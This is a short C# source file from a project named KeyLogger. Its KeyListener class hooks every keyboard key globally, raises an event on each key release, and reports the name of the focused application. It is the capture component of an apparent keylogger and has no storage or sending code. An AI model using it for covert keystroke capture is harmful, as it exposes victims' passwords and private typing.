using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Utilities;

namespace KeyLogger
{
    public class KeyListener
    {
        GlobalKeyboardHook gkh = new GlobalKeyboardHook();

        public List<Keys> HookedKeys 
        { get { return gkh.HookedKeys; } }
        public string FocusedApplicationName 
        { get { return gkh.FocusedApplicationName; } }

        public KeyListener()
        {
            List<Keys> allKeys = Enum.GetValues(typeof(Keys)).Cast<Keys>().ToList();
            gkh.HookedKeys.AddRange(allKeys);
            gkh.KeyUp += gkh_KeyUp;
        }

        void gkh_KeyUp(object sender, KeyEventArgs e)
        {
            OnKeyPressed(e);
        }

        public event KeyEventHandler KeyPressed;
        private void OnKeyPressed(KeyEventArgs e)
        {
            if (KeyPressed != null)
                KeyPressed(this, e);
        }
    }
}
